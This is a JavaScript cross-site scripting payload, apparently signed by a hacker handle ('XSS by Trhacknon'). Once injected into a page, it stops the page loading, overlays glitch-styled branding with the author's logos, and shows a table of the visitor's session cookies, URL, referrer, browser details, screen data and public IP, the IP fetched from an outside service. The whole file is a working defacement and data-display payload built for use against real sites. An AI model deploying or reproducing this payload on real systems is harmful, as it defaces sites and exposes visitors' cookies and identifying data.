// 🔒 trknxssblck.js – Bloque la redirection sans bloquer le DOM
setTimeout(() => {
    window.stop();
    console.log("🚫 Redirection stoppée par trhacknon");
    main();
}, 10); // attendre que le DOM charge un minimum

function main() {
    // === Interface + collecte d'infos ===
    
    // Style glitchy
    const style = `
        @keyframes glitch {
            0% { text-shadow: 2px 2px lime, -2px -2px cyan; }
            50% { text-shadow: -2px -2px lime, 2px 2px cyan; }
            100% { text-shadow: 2px 2px lime, -2px -2px cyan; }
        }
        body {
            background: black;
            color: lime;
            text-align: center;
            font-family: 'Courier New', monospace;
        }
        h2 {
            animation: glitch 1s infinite alternate;
            font-size: 32px;
            text-transform: uppercase;
        }
        .container {
            width: 90%;
            margin: auto;
            padding: 20px;
            border: 2px solid lime;
            box-shadow: 0 0 10px lime;
            text-align: left;
            background: rgba(0, 0, 0, 0.9);
        }
        table {
            width: 100%;
            margin: auto;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid lime;
            padding: 10px;
            text-align: left;
        }
        th {
            background: darkgreen;
            color: white;
        }
        .logo {
            margin-top: 20px;
            animation: glitch 1s infinite alternate;
        }
        .logo img {
            width: 150px;
            height: auto;
            margin: 10px;
        }
    `;
    const styleElement = document.createElement('style');
    styleElement.innerHTML = style;
    document.head.appendChild(styleElement);

    // Titre et logos
    const title = document.createElement('h2');
    title.innerHTML = `<center><img src="https://github.com/trh4ckn0n/work/raw/refs/heads/main/trknanon.svg" alt="Logo 1" /></center>
😈 XSS by Trhacknon 😈`;
    document.body.appendChild(title);

    const container = document.createElement('div');
    container.classList.add('container');
    document.body.appendChild(container);

    const logoContainer = document.createElement('div');
    logoContainer.classList.add('logo');
    logoContainer.innerHTML = `
        <center><img src="https://raw.githubusercontent.com/trh4ckn0n/work/refs/heads/main/trkncat.svg" alt="Logo 2" /></center>
    `;
    container.appendChild(logoContainer);

    // Tableau d'info
    const table = document.createElement('table');
    const headerRow = document.createElement('tr');
    headerRow.innerHTML = `<th>🔑 Clé</th><th>📊 Valeur</th>`;
    table.appendChild(headerRow);
    const infoTableBody = document.createElement('tbody');
    infoTableBody.id = 'infoTable';
    table.appendChild(infoTableBody);
    container.appendChild(table);

    const data = [
        { key: '🍪 COOKIE', value: document.cookie },
        { key: '🌐 DOMAIN', value: document.domain },
        { key: '📌 URL', value: window.location.href },
        { key: '📘 REFERRER', value: document.referrer || 'Aucun' },
        { key: '📑 TITRE', value: document.title },
        { key: '🔧 UserAgent', value: navigator.userAgent },
        { key: '🚀 AppVersion', value: navigator.appVersion },
        { key: '💻 PLATFORM', value: navigator.platform },
        { key: '🖥️ Screen', value: `${screen.width}x${screen.height}` },
        { key: '🌈 Couleurs', value: `${screen.colorDepth}-bit` },
        { key: '🔒 CookieEnabled', value: navigator.cookieEnabled },
        { key: '📱 Online', value: navigator.onLine },
        { key: '🗣️ LANGUAGE', value: navigator.language },
        { key: '⏱️ Temps de chargement', value: `${performance.now().toFixed(2)} ms` },
        { key: '📢 AdBlock', value: 'Vérification...' },
        { key: '💡 IP PUBLIC', value: 'Chargement...' }
    ];

    data.forEach(d => {
        const row = document.createElement('tr');
        row.innerHTML = `<td>${d.key}</td><td>${d.value}</td>`;
        infoTableBody.appendChild(row);
    });

    // IP publique
    fetch('https://api64.ipify.org?format=json')
        .then(res => res.json())
        .then(res => {
            const row = document.createElement('tr');
            row.innerHTML = `<td>💡 IP PUBLIC</td><td>${res.ip}</td>`;
            infoTableBody.appendChild(row);
        });

    // Détection AdBlock
    fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'HEAD' })
        .then(() => {
            const row = document.createElement('tr');
            row.innerHTML = `<td>📢 AdBlock</td><td>Non</td>`;
            infoTableBody.appendChild(row);
        })
        .catch(() => {
            const row = document.createElement('tr');
            row.innerHTML = `<td>📢 AdBlock</td><td>Oui</td>`;
            infoTableBody.appendChild(row);
        });
}
